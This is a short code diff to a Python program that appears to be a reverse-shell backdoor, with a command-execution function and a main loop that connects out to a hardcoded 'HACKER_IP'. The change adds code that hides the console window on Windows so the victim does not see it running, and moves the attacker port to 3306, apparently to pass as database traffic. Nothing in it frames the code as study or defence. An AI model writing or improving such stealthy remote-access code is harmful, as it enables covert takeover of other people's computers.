@@ -7,6 +7,11 @@ import time
 import struct
 from datetime import datetime
 
+
+if os.name == 'nt':
+    import ctypes
+    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
 # Global variable to maintain current working directory
 CURRENT_DIR = os.getcwd()
 
@@ -148,8 +153,8 @@ def execute_command(cmd, conn):
         return f"Error: {str(e)}"
 
 def main():
-    HACKER_IP = "192.168.1.17"  # CHANGE THIS
-    HACKER_PORT = 8008
+    HACKER_IP = "192.168.1.14"  # CHANGE THIS
+    HACKER_PORT = 3306
 
     while True:
         try:
